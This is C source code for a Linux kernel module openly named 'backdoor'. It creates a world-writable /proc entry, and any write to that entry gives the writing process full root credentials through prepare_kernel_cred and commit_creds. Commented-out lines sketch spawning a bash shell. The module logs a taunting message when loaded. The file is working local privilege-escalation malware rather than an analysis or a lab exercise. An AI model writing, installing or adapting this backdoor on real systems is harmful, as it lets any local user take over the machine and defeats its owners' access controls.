#include <linux/module.h>
#include <linux/cdev.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/kthread.h>

#define MODULE_NAME "backdoor"

static int backdoor(void *data)
{
	struct cred *new;
	// char *argv[] = {"/bin/bash", NULL};
	// char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};

	new = prepare_kernel_cred(&init_task);
	if (!new)
		return -ENOMEM;
	commit_creds(new);

	// call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	return 0;
}

static ssize_t proc_write(struct file *file,
						  const char __user *buf,
						  size_t count,
						  loff_t *ppos)
{
	// char kbuf[1024] = {0};
	// struct task_struct *t;
	// size_t len = min(count, sizeof(kbuf) - 1);

	// if (copy_from_user(kbuf, buf, len))
	// 	return -EFAULT;

	backdoor(NULL);

	// t = kthread_run(backdoor, NULL, "backdoor_thread");
	// if (IS_ERR(t))
	// 	return PTR_ERR(t);

	return count;
}

static const struct proc_ops proc_fops = {
	.proc_write = proc_write,
};

static int __init backdoor_init(void)
{
	proc_create(MODULE_NAME, 0666, NULL, &proc_fops);

	pr_info("backdoor: backdoor in your system :)\n");
	return 0;
}

static void __exit backdoor_exit(void)
{
	remove_proc_entry(MODULE_NAME, NULL);
	pr_info("backdoor: module unloaded\n");
}

module_init(backdoor_init);
module_exit(backdoor_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Smirnov A.A.");
MODULE_DESCRIPTION("backdoor: backdoor in your system :)");
MODULE_VERSION("1.0");